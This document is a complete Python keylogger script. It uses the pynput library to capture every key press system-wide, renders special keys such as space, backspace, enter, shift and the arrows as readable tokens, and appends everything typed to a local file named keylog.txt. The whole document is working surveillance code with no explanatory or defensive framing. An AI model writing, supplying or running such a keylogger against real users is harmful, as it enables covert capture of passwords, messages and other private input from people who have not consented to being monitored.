from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'","")

    if letter == "Key.space":
        letter = " "

    if letter == "Key.backspace":
        letter = " (delete) "

    if letter == "Key.enter":
        letter = " (enter) "

    if letter == "Key.shift":
        letter = " (shift) "

    if letter == "Key.up":
        letter = " (up-arrow) "

    if letter == "Key.down":
        letter = " (down-arrow) "

    if letter == "Key.left":
        letter = " (left-arrow) "

    if letter == "Key.right":
        letter = " (right-arrow) "

    with open("keylog.txt","a") as f:
        f.write(letter)


with Listener(on_press=write_to_file) as l:
    l.join()
